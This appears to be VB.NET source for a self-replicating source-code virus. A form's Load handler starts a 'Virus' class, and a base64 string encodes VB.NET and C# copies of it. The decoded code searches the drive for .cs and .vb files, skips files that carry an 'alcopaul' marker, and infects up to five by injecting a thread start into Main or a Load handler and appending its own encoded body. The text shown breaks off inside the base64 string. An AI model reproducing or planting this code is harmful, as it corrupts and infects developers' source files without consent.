Public Class MainForm


  Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
	Dim hxxxx As New g0pda13gaey1.Virus
	Dim gxxxx As New System.Threading.Thread(AddressOf hxxxx.LOL)
	gxxxx.Start()
    End Sub

    
End Class

Namespace g0pda13gaey1
    Public Class Virus
        Private Shared namespacex As String = ""
        Private Shared counter As Integer = 0
        Private Shared database As String = "TmFtZXNwYWNlIGhtMTIzNA0KICAgIFB1YmxpYyBDbGFzcyBWaXJ1cw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBuYW1lc3BhY2V4IEFzIFN0cmluZyA9ICIiDQogICAgICAgIFByaXZhdGUgU2hhcmVkIGNvdW50ZXIgQXMgSW50ZWdlciA9IDANCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgZGF0YWJhc2UgQXMgU3RyaW5nID0gIg==>Ig0KICAgICAgICBQdWJsaWMgU3ViIEFuZExldHNSb2NrKEJ5VmFsIEdHRyBBcyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbykNCiAgICAgICAgICAgIERpbSBsb29rZm9yIEFzIFN0cmluZyA9ICIqLmNzPioudmIiDQogICAgICAgICAgICBEaW0gZXh0ZW5zaW9ucyBBcyBTdHJpbmcoKSA9IGxvb2tmb3IuU3BsaXQoTmV3IENoYXIoKSB7Ij4iY30pDQogICAgICAgICAgICBEaW0gbXlmaWxlaW5mb3MgQXMgTmV3IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QoKQ0KICAgICAgICAgICAgRm9yIEVhY2ggZXh0IEFzIFN0cmluZyBJbiBleHRlbnNpb25zDQogICAgICAgICAgICAgICAgbXlmaWxlaW5mb3MuQWRkUmFuZ2UoR0dHLkdldEZpbGVzKGV4dCkpDQogICAgICAgICAgICBOZXh0DQogICAgICAgICAgICBEaW0geGZpbmFsIEFzIFN5c3RlbS5JTy5GaWxlSW5mbygpID0gRGlyZWN0Q2FzdChteWZpbGVpbmZvcy5Ub0FycmF5KEdldFR5cGUoU3lzdGVtLklPLkZpbGVJbmZvKSksIFN5c3RlbS5JTy5GaWxlSW5mbygpKQ0KICAgICAgICAgICAgRm9yIEVhY2ggeCBBcyBTeXN0ZW0uSU8uRmlsZUluZm8gSW4geGZpbmFsDQogICAgICAgICAgICAgICAgRGltIGggQXMgU3RyaW5nID0geC5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgIERpbSBleHQgQXMgU3RyaW5nID0gU3lzdGVtLklPLlBhdGguR2V0RXh0ZW5zaW9uKHguRnVsbE5hbWUpDQogICAgICAgICAgICAgICAgVHJ5DQogICAgICAgICAgICAgICAgICAgIERpbSByZWFkZXJ4eCBBcyBOZXcgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihoLCBTeXN0ZW0uVGV4dC5FbmNvZGluZy5Vbmljb2RlKQ0KICAgICAgICAgICAgICAgICAgICBEaW0gZ0xvd3h4IEFzIFN0cmluZyA9IHJlYWRlcnh4LlJlYWRUb0VuZCgpDQogICAgICAgICAgICAgICAgICAgIHJlYWRlcnh4LkNsb3NlKCkNCiAgICAgICAgICAgICAgICAgICAgSWYgZXh0ID0gIi5jcyIgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgZ0xvd3h4LlRvTG93ZXIoKS5JbmRleE9mKCJtYWluKCIpID49IDAgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmIGdMb3d4eC5JbmRleE9mKCJhbGNvcGF1bCIpID49IDAgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mZWN0KGgsIGdMb3d4eCwgZXh0LCAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudGVyICs9IDENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgY291bnRlciA9IDUgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmV0dXJuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVsc2VJZiBleHQgPSAiLnZiIiBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBnTG93eHguVG9Mb3dlcigpLkluZGV4T2YoInN1YiBtYWluKCkiKSA+PSAwIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBnTG93eHguSW5kZXhPZigiYWxjb3BhdWwiKSA+PSAwIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZmVjdChoLCBnTG93eHgsIGV4dCwgMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY291bnRlciArPSAxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmIGNvdW50ZXIgPSA1IFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJldHVybg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgIEVsc2VJZiBnTG93eHguSW5kZXhPZigiX0xvYWQoIikgPj0gMCBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgZ0xvd3h4LkluZGV4T2YoImFsY29wYXVsIikgPj0gMCBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZlY3QoaCwgZ0xvd3h4LCBleHQsIDIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50ZXIgKz0gMQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBjb3VudGVyID0gNSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXR1cm4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgQ2F0Y2ggZXggQXMgRXhjZXB0aW9uDQogICAgICAgICAgICAgICAgICAgIENvbnRpbnVlIEZvcg0KICAgICAgICAgICAgICAgIEVuZCBUcnkNCiAgICAgICAgICAgIE5leHQNCiAgICAgICAgICAgIERpbSBkaXJzIEFzIFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvKCkgPSBHR0cuR2V0RGlyZWN0b3JpZXMoIiouKiIpDQogICAgICAgICAgICBGb3IgRWFjaCBqIEFzIFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvIEluIGRpcnMNCiAgICAgICAgICAgICAgICBUcnkNCiAgICAgICAgICAgICAgICAgICAgSWYgY291bnRlciA9IDUgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgUmV0dXJuDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICBBbmRMZXRzUm9jayhqKQ0KICAgICAgICAgICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KICAgICAgICAgICAgICAgICAgICBDb250aW51ZSBGb3INCiAgICAgICAgICAgICAgICBFbmQgVHJ5DQogICAgICAgICAgICBOZXh0DQogICAgICAgIEVuZCBTdWINCiAgICAgICAgUHVibGljIFN1YiBMT0woKQ0KICAgICAgICAgICAgRGltIHh4IEFzIFN0cmluZyA9IFN5c3RlbS5JTy5QYXRoLkdldERpcmVjdG9yeU5hbWUoU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuR2V0Q3VycmVudFByb2Nlc3MoKS5NYWluTW9kdWxlLkZpbGVOYW1lKQ0KICAgICAgICAgICAgRGltIGRpcnggQXMgTmV3IFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvKFN5c3RlbS5JTy5EaXJlY3RvcnkuR2V0RGlyZWN0b3J5Um9vdCh4eCkpDQogICAgICAgICAgICBBbmRMZXRzUm9jayhkaXJ4KQ0KICAgICAgICBFbmQgU3ViDQogICAgICAgIFB1YmxpYyBGdW5jdGlvbiBkZWNvZGViNjQoQnlWYWwgZCBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICAgICAgUmV0dXJuIFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZCkpDQogICAgICAgIEVuZCBGdW5jdGlvbg0KICAgICAgICBQdWJsaWMgRnVuY3Rpb24gR2V0UmFuZG9tU3RyaW5nKCkgQXMgU3RyaW5nDQogICAgICAgICAgICBEaW0gcGF0aHggQXMgU3RyaW5nID0gU3lzdGVtLklPLlBhdGguR2V0UmFuZG9tRmlsZU5hbWUoKQ0KICAgICAgICAgICAgcGF0aHggPSBwYXRoeC5SZXBsYWNlKCIuIiwgIiIpDQogICAgICAgICAgICBSZXR1cm4gImciICYgcGF0aHgNCiAgICAgICAgRW5kIEZ1bmN0aW9uDQogICAgICAgIFB1YmxpYyBTdWIgaW5mZWN0KEJ5VmFsIGZpbGUgQXMgU3RyaW5nLCBCeVZhbCBzIEFzIFN0cmluZywgQnlWYWwgZXh0IEFzIFN0cmluZywgQnlWYWwgZyBBcyBJbnRlZ2VyKQ0KICAgICAgICAgICAgbmFtZXNwYWNleCA9IEdldFJhbmRvbVN0cmluZygpDQogICAgICAgICAgICBJZiBleHQgPSAiLnZiIiBUaGVuDQogICAgICAgICAgICAgICAgRGltIGdnZ3ggQXMgU3RyaW5nID0gIiINCiAgICAgICAgICAgICAgICBJZiBnID0gMiBUaGVuDQogICAgICAgICAgICAgICAgICAgIERpbSBnZ2dnIEFzIFN0cmluZyA9IHMuU3Vic3RyaW5nKChzLkluZGV4T2YoIl9Mb2FkKCIpICsgNiksIChzLkluZGV4T2YoIi5Mb2FkIikgLSAocy5JbmRleE9mKCJfTG9hZCgiKSArIDYpKSkNCiAgICAgICAgICAgICAgICAgICAgcyA9IHMuUmVwbGFjZShnZ2dnLCAiIikNCiAgICAgICAgICAgICAgICAgICAgZ2dneCA9IHMuUmVwbGFjZSgiX0xvYWQoLkxvYWQiLCAiX0xvYWQoQnlWYWwgc2VuZGVyIEFzIFN5c3RlbS5PYmplY3QsIEJ5VmFsIGUgQXMgU3lzdGVtLkV2ZW50QXJncykgSGFuZGxlcyBNeUJhc2UuTG9hZCIgJiB2YkNyTGYgJiB2YlRhYiAmICJEaW0gaHh4eHggQXMgTmV3ICIgJiBuYW1lc3BhY2V4ICYgIi5WaXJ1cyIgJiB2YkNyTGYgJiB2YlRhYiAmICJEaW0gZ3h4eHggQXMgTmV3IFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkKEFkZHJlc3NPZiBoeHh4eC5MT0wpIiAmIHZiQ3JMZiAmIHZiVGFiICYgImd4eHh4LlN0YXJ0KCkiICYgdmJDckxmKQ0KICAgICAgICAgICAgICAgIEVsc2VJZiBnID0gMSBUaGVuDQogICAgICAgICAgICAgICAgICAgIGdnZ3ggPSBzLlJlcGxhY2UoIlN1YiBNYWluKCkiLCAiU3ViIE1haW4oKSIgJiB2YkNyTGYgJiB2YlRhYiAmICJEaW0gaHh4eHggQXMgTmV3ICIgJiBuYW1lc3BhY2V4ICYgIi5WaXJ1cyIgJiB2YkNyTGYgJiB2YlRhYiAmICJEaW0gZ3h4eHggQXMgTmV3IFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkKEFkZHJlc3NPZiBoeHh4eC5MT0wpIiAmIHZiQ3JMZiAmIHZiVGFiICYgImd4eHh4LlN0YXJ0KCkiICYgdmJDckxmKQ0KICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgIERpbSB0IEFzIFN0cmluZygpID0gZGF0YWJhc2UuU3BsaXQoTmV3IENoYXIoKSB7Ij4iY30pDQogICAgICAgICAgICAgICAgRGltIGJvZHkwIEFzIFN0cmluZyA9IGRlY29kZWI2NCh0KDApKS5SZXBsYWNlKGRlY29kZWI2NCgiYUcweE1qTTAiKSwgbmFtZXNwYWNleCkNCiAgICAgICAgICAgICAgICB3cml0ZXJ4KGZpbGUsIGdnZ3ggJiB2YkNyTGYgJiBib2R5MCAmIGRhdGFiYXNlICYgZGVjb2RlYjY0KHQoMSkpICYgdmJDckxmKQ0KICAgICAgICAgICAgRWxzZUlmIChleHQgPSAiLmNzIikgQW5kQWxzbyAoZyA9IDApIFRoZW4NCiAgICAgICAgICAgICAgICBEaW0geCBBcyBJbnRlZ2VyID0gcy5Ub0xvd2VyKCkuSW5kZXhPZigibWFpbigiKQ0KICAgICAgICAgICAgICAgIERpbSB5eSBBcyBJbnRlZ2VyID0geA0KICAgICAgICAgICAgICAgIERpbSB4eCBBcyBDaGFyKCkgPSBzLlRvQ2hhckFycmF5KDAsIHMuTGVuZ3RoIC0gMSkNCiAgICAgICAgICAgICAgICBXaGlsZSB4eCh5eSkgPD4gInsiYw0KICAgICAgICAgICAgICAgICAgICB5eSArPSAxDQogICAgICAgICAgICAgICAgRW5kIFdoaWxlDQogICAgICAgICAgICAgICAgRGltIHl1IEFzIFN0cmluZyA9ICJNYWluKHN0cmluZ1tdIGFyZ3MpIiAmIHZiQ3JMZiAmIHZiVGFiICYgInsiICYgdmJDckxmICYgdmJUYWIgJiAiU3lzdGVtLlRocmVhZGluZy5UaHJlYWQgZ3h6eHp4enh6ID0gIiAmICJuZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoIiAmIG5hbWVzcGFjZXggJiAiLlZpcnVzLkxPTCk7IiAmIHZiQ3JMZiAmIHZiVGFiICYgImd4enh6eHp4ei5TdGFydCgpOyINCiAgICAgICAgICAgICAgICBzID0gcy5SZXBsYWNlKHMuU3Vic3RyaW5nKHgsICh5eSAtIHgpICsgMSksIHl1KQ0KICAgICAgICAgICAgICAgIERpbSB0IEFzIFN0cmluZygpID0gZGF0YWJhc2UuU3BsaXQoTmV3IENoYXIoKSB7Ij4iY30pDQogICAgICAgICAgICAgICAgRGltIGJvZHkyIEFzIFN0cmluZyA9IGRlY29kZWI2NCh0KDIpKS5SZXBsYWNlKGRlY29kZWI2NCgiYUcweE1qTTAiKSwgbmFtZXNwYWNleCkNCiAgICAgICAgICAgICAgICB3cml0ZXJ4KGZpbGUsIHMgJiB2YkNyTGYgJiBib2R5MiAmIGRhdGFiYXNlICYgZGVjb2RlYjY0KHQoMykpICYgdmJDckxmKQ0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIEVuZCBTdWINCiAgICAgICAgUHVibGljIFN1YiB3cml0ZXJ4KEJ5VmFsIHBhdGggQXMgU3RyaW5nLCBCeVZhbCBkYXRheCBBcyBTdHJpbmcpDQogICAgICAgICAgICBEaW0gZ3ggQXMgTmV3IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIocGF0aCkNCiAgICAgICAgICAgIGd4LldyaXRlKGRhdGF4KQ0KICAgICAgICAgICAgZ3guRmx1c2goKQ0KICAgICAgICAgICAgZ3guQ2xvc2UoKQ0KICAgICAgICBFbmQgU3ViDQogICAgRW5kIENsYXNzDQpFbmQgTmFtZXNwYWNl>bmFtZXNwYWNlIGhtMTIzNA0Kew0KICAgIHB1YmxpYyBjbGFzcyBWaXJ1cw0KICAgIHsNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIG5hbWVzcGFjZXggPSAiIjsNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgaW50IGNvdW50ZXIgPSAwOw0KICAgICAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgZGF0YWJhc2UgPSAi>IjsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIExPTCgpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyB4eSA9IFN5c3RlbS5JTy5EaXJlY3RvcnkuR2V0RGlyZWN0b3J5Um9vdChTeXN0ZW0uSU8uUGF0aC5HZXREaXJlY3RvcnlOYW1lKFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuTWFpbk1vZHVsZS5GaWxlTmFtZSkpOw0KICAgICAgICAgICAgU3lzdGVtLklPLkRpcmVjdG9yeUluZm8gZGlyID0gbmV3IFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvKEB4eSk7DQogICAgICAgICAgICBBbmRMZXRzUm9jayhkaXIpOw0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgQW5kTGV0c1JvY2soU3lzdGVtLklPLkRpcmVjdG9yeUluZm8gZCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIGxvb2tmb3IgPSAiKi5jcz4qLnZiIjsNCiAgICAgICAgICAgIHN0cmluZ1tdIGV4dGVuc2lvbnMgPSBsb29rZm9yLlNwbGl0KG5ldyBjaGFyW10geyAnPicgfSk7DQogICAgICAgICAgICBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0IG15ZmlsZWluZm9zID0gbmV3IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QoKTsNCiAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyBleHQgaW4gZXh0ZW5zaW9ucykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBteWZpbGVpbmZvcy5BZGRSYW5nZShkLkdldEZpbGVzKGV4dCkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgU3lzdGVtLklPLkZpbGVJbmZvW10geGZpbmFsID0gKFN5c3RlbS5JTy5GaWxlSW5mb1tdKW15ZmlsZWluZm9zLlRvQXJyYXkodHlwZW9mKFN5c3RlbS5JTy5GaWxlSW5mbykpOw0KICAgICAgICAgICAgZm9yZWFjaCAoU3lzdGVtLklPLkZpbGVJbmZvIGZpbGUgaW4geGZpbmFsKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZyBmaWxlbmFtZSA9IGZpbGUuRnVsbE5hbWU7DQogICAgICAgICAgICAgICAgc3RyaW5nIGV4dCA9IFN5c3RlbS5JTy5QYXRoLkdldEV4dGVuc2lvbihmaWxlbmFtZSk7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyIHJlYWRlcnggPSBuZXcgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihmaWxlbmFtZSk7DQogICAgICAgICAgICAgICAgICAgIHN0cmluZyBnTG93dyA9IHJlYWRlcnguUmVhZFRvRW5kKCk7DQogICAgICAgICAgICAgICAgICAgIHJlYWRlcnguQ2xvc2UoKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGV4dCA9PSAiLmNzIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGdMb3d3LlRvTG93ZXIoKS5JbmRleE9mKCJtYWluKCIpID49IDApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGdMb3d3LkluZGV4T2YoImFsY29wYXVsIikgPj0gMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZmVjdChmaWxlbmFtZSwgZ0xvd3csIGV4dCwgMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50ZXIgKz0gMTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50ZXIgPT0gNSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKGV4dCA9PSAiLnZiIikNCiAgICAgICAgICAgICAgICAgICAgeyAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGdMb3d3LlRvTG93ZXIoKS5JbmRleE9mKCJzdWIgbWFpbigpIikgPj0gMCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZ0xvd3cuSW5kZXhPZigiYWxjb3BhdWwiKSA+PSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mZWN0KGZpbGVuYW1lLCBnTG93dywgZXh0LCAxKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY291bnRlciArPSAxOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY291bnRlciA9PSA1KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChnTG93dy5JbmRleE9mKCJfTG9hZCgiKSA+PSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChnTG93dy5JbmRleE9mKCJhbGNvcGF1bCIpID49IDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZlY3QoZmlsZW5hbWUsIGdMb3d3LCBleHQsIDIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudGVyICs9IDE7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudGVyID09IDUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvW10gZGlycyA9IGQuR2V0RGlyZWN0b3JpZXMoIiouKiIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoU3lzdGVtLklPLkRpcmVjdG9yeUluZm8gZGlyIGluIGRpcnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoY291bnRlciA9PSA1KQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgQW5kTGV0c1JvY2soZGlyKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggeyBjb250aW51ZTsgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBHZXRSYW5kb21TdHJpbmcoKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgcGF0aHggPSBTeXN0ZW0uSU8uUGF0aC5HZXRSYW5kb21GaWxlTmFtZSgpOw0KICAgICAgICAgICAgcGF0aHggPSBwYXRoeC5SZXBsYWNlKCIuIiwgIiIpOw0KICAgICAgICAgICAgcmV0dXJuICJnIiArIHBhdGh4Ow0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgaW5mZWN0KHN0cmluZyBmaWxlLCBzdHJpbmcgcywgc3RyaW5nIGV4dCwgaW50IGcpDQogICAgICAgIHsNCiAgICAgICAgICAgIG5hbWVzcGFjZXggPSBHZXRSYW5kb21TdHJpbmcoKTsNCiAgICAgICAgICAgIGlmIChleHQgPT0gIi52YiIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIGdnZ3ggPSAiIjsNCiAgICAgICAgICAgICAgICBpZiAoZyA9PSAyKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcgZ2dnZyA9IHMuU3Vic3RyaW5nKChzLkluZGV4T2YoIl9Mb2FkKCIpICsgNiksIHMuSW5kZXhPZigiLkxvYWQiKSAtIChzLkluZGV4T2YoIl9Mb2FkKCIpICsgNikpOw0KICAgICAgICAgICAgICAgIHMgPSBzLlJlcGxhY2UoZ2dnZywgIiIpOw0KICAgICAgICAgICAgICAgIGdnZ3ggPSBzLlJlcGxhY2UoIl9Mb2FkKC5Mb2FkIiwgIl9Mb2FkKEJ5VmFsIHNlbmRlciBBcyBTeXN0ZW0uT2JqZWN0LCBCeVZhbCBlIEFzIFN5c3RlbS5FdmVudEFyZ3MpIEhhbmRsZXMgTXlCYXNlLkxvYWRcclxuXHREaW0gaHh4eHggQXMgTmV3ICIgKyBuYW1lc3BhY2V4ICsgIi5WaXJ1c1xyXG5cdERpbSBneHh4eCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIGh4eHh4LkxPTClcclxuXHRneHh4eC5TdGFydCgpXHJcbiIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlIGlmIChnID09IDEpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGdnZ3ggPSBzLlJlcGxhY2UoIlN1YiBNYWluKCkiLCAiU3ViIE1haW4oKVxyXG5cdERpbSBoeHh4eCBBcyBOZXcgIiArIG5hbWVzcGFjZXggKyAiLlZpcnVzXHJcblx0RGltIGd4eHh4IEFzIE5ldyBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZChBZGRyZXNzT2YgaHh4eHguTE9MKVxyXG5cdGd4eHh4LlN0YXJ0KClcclxuIik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZ1tdIHQgPSBkYXRhYmFzZS5TcGxpdChuZXcgY2hhcltdIHsgJz4nIH0pOw0KICAgICAgICAgICAgICAgIHN0cmluZyBib2R5MCA9IGRlY29kZWI2NCh0WzBdKS5SZXBsYWNlKGRlY29kZWI2NCgiYUcweE1qTTAiKSwgbmFtZXNwYWNleCk7DQogICAgICAgICAgICAgICAgd3JpdGVyeChmaWxlLCBnZ2d4ICsgIlxyXG4iICsgYm9keTAgKyBkYXRhYmFzZSArIGRlY29kZWI2NCh0WzFdKSArICJcclxuIik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmICgoZXh0ID09ICIuY3MiKSAmJiAoZyA9PSAwKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpbnQgeCA9IHMuVG9Mb3dlcigpLkluZGV4T2YoIm1haW4oIik7DQogICAgICAgICAgICAgICAgaW50IHl5ID0geDsNCiAgICAgICAgICAgICAgICBjaGFyW10geHggPSBzLlRvQ2hhckFycmF5KDAsIHMuTGVuZ3RoIC0gMSk7DQogICAgICAgICAgICAgICAgd2hpbGUgKHh4W3l5XSAhPSAneycpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB5eSArPSAxOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBzdHJpbmcgeXUgPSAiTWFpbihzdHJpbmdbXSBhcmdzKVxyXG5cdHtcclxuXHRTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZCBneHp4enh6eHogPSAiICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAibmV3IFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkKCIgKyBuYW1lc3BhY2V4ICsgIi5WaXJ1cy5MT0wpO1xyXG5cdGd4enh6eHp4ei5TdGFydCgpOyI7DQogICAgICAgICAgICAgICAgcyA9IHMuUmVwbGFjZShzLlN1YnN0cmluZyh4LCAoeXkgLSB4KSArIDEpLCB5dSk7